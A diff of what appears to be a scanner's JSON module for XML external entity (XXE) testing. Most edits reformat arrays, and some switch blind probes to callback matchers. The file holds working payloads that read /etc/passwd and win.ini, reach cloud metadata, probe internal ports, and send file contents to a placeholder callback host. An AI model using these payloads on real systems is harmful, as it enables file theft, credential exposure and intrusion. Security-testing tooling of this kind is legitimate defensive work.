@@ -4,7 +4,7 @@
     "1. IDENTIFY PARSER: Java (Xerces, JAXP), PHP (libxml), .NET (XmlDocument), Python (lxml, ElementTree). Each has different default entity-resolution behavior.",
     "2. CONFIRM XML PROCESSING: server accepts Content-Type: application/xml or text/xml. SOAP, SVG, DOCX, XLSX (zipped XML), RSS, OOXML are all carriers.",
     "3. SIMPLE FILE READ: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>`. If entities resolved, file content reflected.",
-    "4. BLIND XXE: parser doesn't reflect — use OOB. `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://COLLAB/x.dtd'>%xxe;]>` with external DTD that exfiltrates via parameter entity. Replace COLLAB per Rule 9a.",
+    "4. BLIND XXE: parser doesn't reflect \u2014 use OOB. `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://COLLAB/x.dtd'>%xxe;]>` with external DTD that exfiltrates via parameter entity. Replace COLLAB per Rule 9a.",
     "5. ERROR-BASED XXE: parameter entity triggers error containing file content. Effective when server parses but suppresses entity expansion in body.",
     "6. PARAMETER ENTITY (PE) FOR BLIND: many parsers permit PE in external DTD even when blocking PE in input.",
     "7. SVG-XXE: SVG with DOCTYPE is XML-parsed by image libs (ImageMagick, librsvg). Upload + view as profile pic = file read.",
@@ -15,27 +15,62 @@
   "contexts": {
     "file_read": {
       "description": "XXE file read via external entity",
-      "tech_match": ["Java", "PHP", ".NET"],
-      "param_match": ["xml", "data", "payload", "soap", "content", "body"],
+      "tech_match": [
+        "Java",
+        "PHP",
+        ".NET"
+      ],
+      "param_match": [
+        "xml",
+        "data",
+        "payload",
+        "soap",
+        "content",
+        "body"
+      ],
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
           "description": "Linux /etc/passwd read via external entity",
-          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "root:x:0",
+                "root:"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
           "description": "Windows win.ini read via external entity",
-          "matchers": [{"type": "word", "words": ["[extensions]", "[fonts]", "for 16-bit"], "condition": "or"}],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "[extensions]",
+                "[fonts]",
+                "for 16-bit"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
           "description": "PHP filter base64 encode for binary-safe file read",
-          "matchers": [{"type": "regex", "pattern": "[A-Za-z0-9+/]{20,}={0,2}"}],
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "[A-Za-z0-9+/]{20,}={0,2}"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         }
@@ -44,19 +79,44 @@
     "ssrf_via_xxe": {
       "description": "SSRF via XXE external entity to internal services",
       "tech_match": [],
-      "param_match": ["xml", "data", "payload", "soap"],
+      "param_match": [
+        "xml",
+        "data",
+        "payload",
+        "soap"
+      ],
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
           "description": "AWS metadata via XXE SSRF",
-          "matchers": [{"type": "word", "words": ["ami-id", "instance-id", "hostname"], "condition": "or"}],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "hostname"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22/\">]><foo>&xxe;</foo>",
           "description": "Internal port scan via XXE (SSH banner)",
-          "matchers": [{"type": "word", "words": ["SSH", "OpenSSH", "refused"], "condition": "or"}],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SSH",
+                "OpenSSH",
+                "refused"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
         }
@@ -65,84 +125,178 @@
     "blind_oob": {
       "description": "Blind XXE via out-of-band data exfiltration",
       "tech_match": [],
-      "param_match": ["xml", "data", "payload", "soap"],
+      "param_match": [
+        "xml",
+        "data",
+        "payload",
+        "soap"
+      ],
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{callback}}/xxe_test\">%xxe;]><foo>test</foo>",
-          "description": "Blind XXE OOB — external DTD callback (verify via Collaborator interaction)",
-          "matchers": [{"type": "status", "status": [200, 500]}],
+          "description": "Blind XXE OOB \u2014 external DTD callback (verify via Collaborator interaction)",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "interaction": "any"
+            }
+          ],
           "severity": "high",
           "confidence_boost": 30,
-          "variables": {"callback": "COLLABORATOR_URL"}
+          "variables": {
+            "callback": "COLLABORATOR_URL"
+          }
         }
       ]
     },
     "error_based": {
       "description": "Error-based XXE to extract data via error messages",
       "tech_match": [],
-      "param_match": ["xml", "data", "payload"],
+      "param_match": [
+        "xml",
+        "data",
+        "payload"
+      ],
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///nonexistent\">%xxe;]><foo>test</foo>",
-          "description": "Error-based XXE — trigger file not found error with path disclosure",
-          "matchers": [{"type": "word", "words": ["No such file", "FileNotFoundException", "failed to load"], "condition": "or"}],
+          "description": "Error-based XXE \u2014 trigger file not found error with path disclosure",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "No such file",
+                "FileNotFoundException",
+                "failed to load"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 25
         }
       ]
     },
     "parameter_entity": {
-      "description": "Parameter entity XXE for OOB exfiltration — two-stage with external DTD",
-      "tech_match": ["Java", "PHP", ".NET"],
-      "param_match": ["xml", "data", "payload", "soap"],
+      "description": "Parameter entity XXE for OOB exfiltration \u2014 two-stage with external DTD",
+      "tech_match": [
+        "Java",
+        "PHP",
+        ".NET"
+      ],
+      "param_match": [
+        "xml",
+        "data",
+        "payload",
+        "soap"
+      ],
       "probes": [
         {
           "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://{{callback}}/?data=%xxe;'>\">%eval;%exfil;]><foo>test</foo>",
-          "description": "Parameter entity chained exfiltration — reads /etc/passwd and sends to Collaborator",
-          "matchers": [{"type": "status", "status": [200, 400, 500]}],
+          "description": "Parameter entity chained exfiltration \u2014 reads /etc/passwd and sends to Collaborator",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "interaction": "any"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 45,
-          "variables": {"callback": "COLLABORATOR_URL"}
+          "variables": {
+            "callback": "COLLABORATOR_URL"
+          }
         }
       ]
     },
     "xinclude": {
-      "description": "XInclude attack — XXE when DOCTYPE cannot be controlled (e.g., server-side XML merge)",
-      "tech_match": ["Java", ".NET"],
-      "param_match": ["xml", "data", "content"],
+      "description": "XInclude attack \u2014 XXE when DOCTYPE cannot be controlled (e.g., server-side XML merge)",
+      "tech_match": [
+        "Java",
+        ".NET"
+      ],
+      "param_match": [
+        "xml",
+        "data",
+        "content"
+      ],
       "probes": [
         {
           "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
-          "description": "XInclude file read — works when attacker controls XML value inserted into server-parsed document",
-          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "description": "XInclude file read \u2014 works when attacker controls XML value inserted into server-parsed document",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "root:x:0",
+                "root:"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         }
       ]
     },
     "svg_xxe": {
-      "description": "XXE via SVG file upload — XML parser processes uploaded SVG",
+      "description": "XXE via SVG file upload \u2014 XML parser processes uploaded SVG",
       "tech_match": [],
-      "param_match": ["file", "upload", "image", "svg", "attachment"],
+      "param_match": [
+        "file",
+        "upload",
+        "image",
+        "svg",
+        "attachment"
+      ],
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
-          "description": "XXE via SVG upload — hostname disclosure if server renders/parses the SVG",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "regex", "pattern": "[a-zA-Z0-9\\-]+"}],
+          "description": "XXE via SVG upload \u2014 hostname disclosure if server renders/parses the SVG",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "[a-zA-Z0-9\\-]+"
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
         }
       ]
     },
     "soap_xxe": {
-      "description": "XXE embedded in SOAP envelope — SOAP endpoints often use XML parsers with XXE enabled",
-      "tech_match": ["Java", ".NET", "SOAP", "WCF"],
-      "param_match": ["soap", "xml", "wsdl", "envelope"],
+      "description": "XXE embedded in SOAP envelope \u2014 SOAP endpoints often use XML parsers with XXE enabled",
+      "tech_match": [
+        "Java",
+        ".NET",
+        "SOAP",
+        "WCF"
+      ],
+      "param_match": [
+        "soap",
+        "xml",
+        "wsdl",
+        "envelope"
+      ],
       "probes": [
         {
           "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
-          "description": "XXE in SOAP envelope body — triggers if SOAP parser has external entities enabled",
-          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "description": "XXE in SOAP envelope body \u2014 triggers if SOAP parser has external entities enabled",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "root:x:0",
+                "root:"
+              ],
+              "condition": "or"
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         }
